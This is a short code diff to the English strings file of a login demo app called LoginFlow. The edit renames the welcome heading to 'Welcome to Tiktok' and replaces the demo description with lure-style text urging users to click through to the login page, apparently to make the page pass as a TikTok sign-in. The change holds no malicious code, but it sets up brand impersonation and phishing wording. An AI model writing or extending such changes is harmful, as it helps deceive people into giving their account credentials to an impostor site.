@@ -37,8 +37,8 @@ export const languages = {
 export type Language = keyof typeof languages;
 
 const en = {
-  welcomeToLoginFlow: 'Welcome to LoginFlow',
-  loginFlowDescription: 'A demonstration of a modern, secure, and user-friendly login experience, inspired by the best.',
+  welcomeToLoginFlow: 'Welcome to Tiktok',
+  loginFlowDescription: 'kindly click the View login page button below to open our established connection with our secure internet environment',
   viewLoginPage: 'View Login Page',
   loginToLoginFlow: 'Log in to LoginFlow',
   loginSubheading: 'Manage your account, check notifications, comment on videos, and more.',
